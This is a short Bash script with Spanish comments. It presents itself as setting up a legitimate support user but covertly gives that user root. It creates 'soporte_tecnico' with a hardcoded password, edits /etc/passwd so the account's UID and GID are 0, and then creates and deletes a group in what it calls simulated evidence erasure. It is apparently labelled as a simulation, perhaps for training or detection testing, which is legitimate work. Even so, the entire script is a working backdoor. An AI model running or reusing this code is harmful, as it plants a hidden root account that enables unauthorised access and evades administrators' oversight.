#!/usr/bin/bash
# Crea un usuario legítimo pero manipula el UID por detrás

echo "[*] Creando usuario de soporte..."
useradd -m -s /bin/bash soporte_tecnico 2>/dev/null
echo "soporte_tecnico:ClaveSoporte123" | chpasswd

echo "[*] Ejecutando sabotaje de UID..."
# Modifica el UID de soporte_tecnico directamente en /etc/passwd para que sea 0 (Root)
sed -i 's/^soporte_tecnico:x:[0-9]\+:[0-9]\+:/soporte_tecnico:x:0:0:/' /etc/passwd

# Simular borrado de evidencias en grupos
groupadd grupo_eliminado 2>/dev/null
groupdel grupo_eliminado 2>/dev/null

echo "Simulacion 2 completada."
